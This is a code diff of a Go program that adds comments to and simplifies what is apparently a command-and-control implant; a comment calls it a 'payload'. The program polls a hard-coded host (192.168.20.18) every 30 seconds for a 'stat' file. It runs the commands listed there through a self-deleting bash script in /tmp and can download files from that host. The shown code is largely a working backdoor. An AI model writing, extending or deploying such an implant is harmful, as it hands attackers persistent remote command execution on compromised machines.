@@ -1,3 +1,5 @@
+// Michael Burke
+
 package main
 
 import (
@@ -5,7 +7,6 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
-	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
@@ -14,12 +15,14 @@ import (
 	"time"
 )
 
+//Initialize variables
 var downDir string = "/tmp/"
 var host string = "http://192.168.20.18/"
 var edition int = 0
 var isVerbose bool = false
 
 func main() {
+	//Check for arguments
 	args := os.Args
 	if len(args) > 1 {
 		for i := 1; i < len(args); i++ {
@@ -36,8 +39,11 @@ func do() {
 	if isVerbose {
 		fmt.Printf("Grabbing HTTP\n")
 	}
+	//Get and read stat file
 	stat := getHTTP(host + "stat")
 	commands := strings.Split(stat, "\n")
+
+	//Edition tells us if there are new commands to execute
 	if strings.Index(commands[0], "EDITION") == -1 {
 		if isVerbose {
 			fmt.Println("Edition doesn't exist")
@@ -54,6 +60,8 @@ func do() {
 		return
 	}
 	edition = newEdition
+
+	//Read commands
 	for i := 0; i < len(commands); i++ {
 		command := commands[i]
 		switch command {
@@ -106,6 +114,7 @@ func moveFile(src, dest string) {
 }
 
 func runCommand(command string) {
+	//Create a bash script to run the command so I don't have to deal with exec.Command
 	command = "#!/bin/bash\n" + command + "\nrm -f " + downDir + "executeme.sh"
 	ioutil.WriteFile(downDir+"executeme.sh", []byte(command), 0777)
 	cmd := exec.Command(downDir + "executeme.sh")
@@ -118,17 +127,13 @@ func execute(command string) {
 }
 
 func repeat() {
+	//No random for this payload; check every 30 seconds
 	delay := ( /*random(19) + */ 30)
 	if isVerbose {
 		fmt.Printf("Sleeping for %d Seconds\n", delay)
 	}
 	time.Sleep(time.Duration(delay) * time.Second)
 	do()
-}
-
-func random(n int) int {
-	rand.Seed(time.Now().UnixNano())
-	return rand.Intn(n)
 }
 
 func downloadFile(filepath string, url string) error {
@@ -150,16 +155,13 @@ func downloadFile(filepath string, url string) error {
 }
 
 func getHTTP(url string) string {
+	//Basic HTTP GET requet
 	resp, err := http.Get(url)
-
 	if err != nil {
 		log.Fatal(err)
 	}
-
 	defer resp.Body.Close()
-
 	body, err := ioutil.ReadAll(resp.Body)
-
 	if err != nil {
 		log.Fatal(err)
 	}
